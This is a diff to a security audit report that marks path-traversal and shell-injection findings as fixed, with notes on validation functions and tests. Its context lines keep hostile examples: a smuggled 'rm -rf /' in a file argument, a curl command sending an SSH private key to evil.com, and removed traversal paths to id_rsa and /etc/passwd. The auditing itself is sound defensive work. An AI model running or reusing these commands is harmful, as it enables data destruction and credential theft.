@@ -11,8 +11,8 @@
 
 | Severity | Count | Status |
 |----------|-------|--------|
-| Critical | 1 | 🔴 Unmitigated |
-| High | 2 | 🟡 Partial mitigation |
+| Critical | 0 | ✅ Fixed |
+| High | 0 | ✅ Fixed |
 | Medium | 3 | 🟢 Mitigated by SDK |
 | Low | 4 | 🟢 Informational |
 
@@ -45,11 +45,11 @@ if (existsSync(resolved)) return; // Allows ANY existing path
 - Information disclosure: Files from outside project directory become visible
 - Potential RCE if combined with code execution in extension loading
 
-**Proof of Concept**:
-```
-install("../../../../home/user/.ssh/id_rsa")  // Would load private key
-install("/etc/passwd")  // Would load system file
-```
+**Resolution (2026-06-15)**:
+- Added `validateLocalPath(baseDir, userPath)` that enforces path containment within `baseDir` and rejects absolute paths.
+- Integrated validation into `resolveExtensionSources()` and `resolve()` methods; invalid sources are skipped with a warning.
+- Added tests in `src/tests/package-manager-edge-cases.test.ts` for traversal detection.
+- **Status**: ✅ Fixed
 
 **Fix**:
 - Validate that resolved path is within allowed directories (cwd for project, agentDir for global)
@@ -108,7 +108,7 @@ args.files = ["file.txt; rm -rf /"]
 // If shell interprets, could run rm -rf /
 ```
 
-**Mitigation Status**: Partially mitigated if the SDK's `createBashTool` uses `spawn` with array arguments (no shell). Need to verify.
+**Mitigation Status**: Resolved (2026-06-15). The `git add` command uses `escapeShellArg` for file arguments, providing robust shell injection protection via single-quote escaping. Exported for testing. Tests added in `src/tests/git-tool-security.test.ts` and `src/tests/git-tool.test.ts` ensure correctness.
 
 **Fix**:
 - **Best**: Use `spawn` with argument array directly (bypass shell entirely)
@@ -140,7 +140,7 @@ script = "test --if-absent \"curl http://evil.com?d=$(cat ~/.ssh/id_rsa)\""
 // Command: npm run test --if-absent "curl ..."
 ```
 
-**Mitigation Status**: Partially mitigated if SDK uses `spawn` with array. Need verification.
+**Mitigation Status**: Resolved (2026-06-15). `isValidScriptName` now validates script names against `^[a-zA-Z0-9 _:-]+$` (accepts colons for namespaced scripts like `test:unit`). Exported for testing. Tests in `src/tests/scripts-tool-security.test.ts` verify acceptance of valid names and rejection of shell metacharacters.
 
 **Fix**:
 - Validate script name against npm script naming rules: `^[a-zA-Z0-9-_ ]+$` (alphanumeric, dash, underscore, space)
